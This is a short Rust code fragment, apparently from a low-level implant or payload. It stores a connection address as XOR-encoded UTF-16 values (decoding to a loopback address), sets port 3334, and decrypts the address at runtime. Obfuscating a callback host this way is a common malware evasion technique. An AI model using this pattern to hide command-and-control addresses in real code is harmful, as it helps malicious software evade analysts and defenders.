
        static IP_OR_DOMAIN: Once<alloc::vec::Vec<u16>> = Once::new();

        pub fn init_ip_or_domain() {
            let _ = IP_OR_DOMAIN.call_once(|| {
                alloc::vec![27529, 27530, 27535, 27542, 27528, 27542, 27528, 27542, 27529] 
            });
        }

        pub static PORT: u16 = 3334;
        const KEY: u16 = 27576;

        fn simple_decrypt(input: &[u16], key: u16) -> alloc::vec::Vec<u16> {
            let decrypted_utf16: alloc::vec::Vec<u16> = input.iter().map(|x| x ^ key).collect();
            decrypted_utf16
        }

        pub fn get_ip_or_domain() -> alloc::vec::Vec<u16> {
            simple_decrypt(IP_OR_DOMAIN.get().unwrap(), KEY)
        }
        
